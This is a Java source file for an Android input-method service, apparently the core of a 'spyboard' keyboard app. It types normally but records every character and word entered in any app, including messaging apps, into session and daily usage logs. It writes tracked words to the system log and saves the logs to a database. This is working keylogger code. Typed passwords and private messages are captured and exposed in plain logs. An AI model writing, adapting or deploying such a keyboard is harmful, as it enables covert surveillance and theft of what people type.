package com.idankorenisraeli.spyboard.input;

import android.inputmethodservice.Keyboard;
import android.inputmethodservice.KeyboardView;
import android.text.TextUtils;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.view.inputmethod.EditorInfo;
import android.view.inputmethod.InputConnection;

import com.idankorenisraeli.spyboard.common.TimeManager;
import com.idankorenisraeli.spyboard.data.DailyUsageLog;
import com.idankorenisraeli.spyboard.data.DatabaseManager;
import com.idankorenisraeli.spyboard.data.OnDailyLogLoaded;
import com.idankorenisraeli.spyboard.data.UsageLog;
import com.idankorenisraeli.spyboard.utils.KeycodeDictionary;
import com.idankorenisraeli.spyboard.R;

/**
 * This class will simulate the functionality of an android keyboard,
 * With custom tracking of all the pressed keys
 */
public class SpyInputMethodService extends android.inputmethodservice.InputMethodService {

    SpyKeyboardView keyboardView;
    KeycodeDictionary dictionary;

    boolean caps = false;
    boolean hebrewMode = false;

    Keyboard engKeyboard, hebKeyboard;

    String currentDate;
    DailyUsageLog dailyLog;
    UsageLog sessionUsageLog;

    private static final int AVG_WORD_LENGTH = 16;

    StringBuilder currentWord = new StringBuilder(AVG_WORD_LENGTH);

    DatabaseManager databaseManager;


    interface KEYS {
        int ENTER = -10;
    }

    @Override
    public View onCreateInputView() {
        keyboardView = (SpyKeyboardView) getLayoutInflater().inflate(R.layout.keyboard_view_blue, null);
        initKeyboards();
        initDailyLog();

        return keyboardView;
    }

    private void initKeyboards(){
        engKeyboard = new Keyboard(this, R.xml.qwerty_eng);
        hebKeyboard = new Keyboard(this, R.xml.qwerty_heb);

        dictionary = KeycodeDictionary.getInstance();

        keyboardView.setKeyboard(hebrewMode ? hebKeyboard : engKeyboard);
        keyboardView.setOnKeyboardActionListener(keyBoardAction);

        keyboardView.setPreviewEnabled(false);

    }

    private void initDailyLog(){
        databaseManager = DatabaseManager.getInstance();
        currentDate = TimeManager.getInstance().getDateOfToday();
        databaseManager.loadDailyLog(currentDate, new OnDailyLogLoaded() {
            @Override
            public void onDailyLogLoaded(DailyUsageLog loadedLog) {
                if(loadedLog != null)
                    dailyLog = loadedLog;
                else
                    dailyLog = new DailyUsageLog();
            }
        });
    }


    //region Keyboard Actions
    private void languageAction() {
        hebrewMode = !hebrewMode;
        keyboardView.setKeyboard(hebrewMode ? hebKeyboard : engKeyboard);
        // Updating the keyboard view based on the current mode
    }

    private void deleteAction(InputConnection ic) {
        CharSequence selectedText = ic.getSelectedText(0);
        if (TextUtils.isEmpty(selectedText)) {
            // no selection, so delete previous character
            ic.deleteSurroundingText(1, 0);
            if(currentWord.length() > 0){
                currentWord.deleteCharAt(currentWord.length()-1);
            }
        } else {
            // delete the selection
            ic.commitText("", 1);
        }
    }

    private void shiftAction() {
        caps = !caps;
        keyboardView.setShifted(caps);
    }

    private void enterAction(InputConnection ic) {
        ic.sendKeyEvent(new KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_ENTER));
    }

    private void charAction(int primaryCode, InputConnection ic) {
        String typed = codeToString(primaryCode);
        ic.commitText(typed, 1); //writing to screen

        trackKeyPress(typed);
    }

    private void trackKeyPress(String typed) {
        if (sessionUsageLog != null) {

            if (typed.equals(" ")) {
                trackWord();
                //reset the strbuilder
            } else {
                currentWord.append(typed); //Calculating the word by adding char by char
                sessionUsageLog.addChar(typed); //Adding to single chars map
            }
        }
    }

    private void trackWord(){
        if(currentWord.length() > 0) {
            sessionUsageLog.addWord(currentWord.toString());
            Log.i("pttt" , "Tracked " + currentWord.toString());
            currentWord = new StringBuilder(AVG_WORD_LENGTH);
        }
    }

    private String codeToString(int primaryCode) {
        char finalCode;
        if (hebrewMode) {
            finalCode = dictionary.engToHeb(primaryCode);
        } else {
            primaryCode = caps ? primaryCode + ('A' - 'a') : primaryCode; // converting to upper case when shift
            finalCode = (char) primaryCode; // converting to char
        }


        return String.valueOf(finalCode);
    }

    //endregion


    KeyboardView.OnKeyboardActionListener keyBoardAction = new KeyboardView.OnKeyboardActionListener() {
        @Override
        public void onPress(int primaryCode) {
        }

        @Override
        public void onRelease(int primaryCode) {

        }

        @Override
        public void onKey(int primaryCode, int[] keyCodes) {
            InputConnection ic = getCurrentInputConnection();
            if (ic == null) return;
            if(!isTextBefore()) {
                trackWord();
            }
            switch (primaryCode) {
                case Keyboard.KEYCODE_DELETE:
                    deleteAction(ic);
                    break;
                case Keyboard.KEYCODE_SHIFT:
                    shiftAction();
                    break;
                case Keyboard.KEYCODE_MODE_CHANGE:
                    languageAction();
                    break;
                case KEYS.ENTER:
                    enterAction(ic);
                    break;

                default:
                    charAction(primaryCode, ic);
            }
        }


        @Override
        public void onText(CharSequence text) {
        }

        @Override
        public void swipeLeft() {

        }

        @Override
        public void swipeRight() {

        }

        @Override
        public void swipeDown() {

        }

        @Override
        public void swipeUp() {

        }
    };


    /**
     * This method will calculate if there is a text before current ic
     * It will help us calcualte a new word even though user did not press the spacebar
     * because in messaging apps, like whatsapp, there is a 'send' key which is not a part of the keyboard
     * and there is still a new word there that needs to be tacked.
     * @return true when there is a text before the cursor
     */
    private boolean isTextBefore(){
        InputConnection ic = getCurrentInputConnection();
        return ic.getTextBeforeCursor(1,0).length() != 0;
    }



    @Override
    public void onStartInputView(EditorInfo info, boolean restarting) {
        super.onStartInputView(info, restarting);

        if(sessionUsageLog==null)
            sessionUsageLog = new UsageLog();

        if (!currentDate.equals(TimeManager.getInstance().getDateOfToday())) {
            // new day
            endInputSession(); //restart the current session
            dailyLog = new DailyUsageLog(); //restart the daily log
        }

    }


    //This called before onStarted
    @Override
    public void onStartInput(EditorInfo attribute, boolean restarting) {
        super.onStartInput(attribute, restarting);
        Log.i("pttt", "onStartInput");
    }

    @Override
    public void onFinishInputView(boolean finishingInput) {
        super.onFinishInputView(finishingInput);

        endInputSession();

        if (dailyLog != null) {
            databaseManager.saveDailyLog(dailyLog);
            //Saving into database
        }
    }

    private void endInputSession(){
        if (currentWord != null) {
            trackWord();
        }
        //Adding the last word written in this session

        Log.i("pttt", "Words:" + sessionUsageLog.getWordFreq());
        dailyLog.addLog(sessionUsageLog);
        //Adding the session data that is finished to the day's total

        sessionUsageLog = new UsageLog();
        // New keyboard usage
    }


}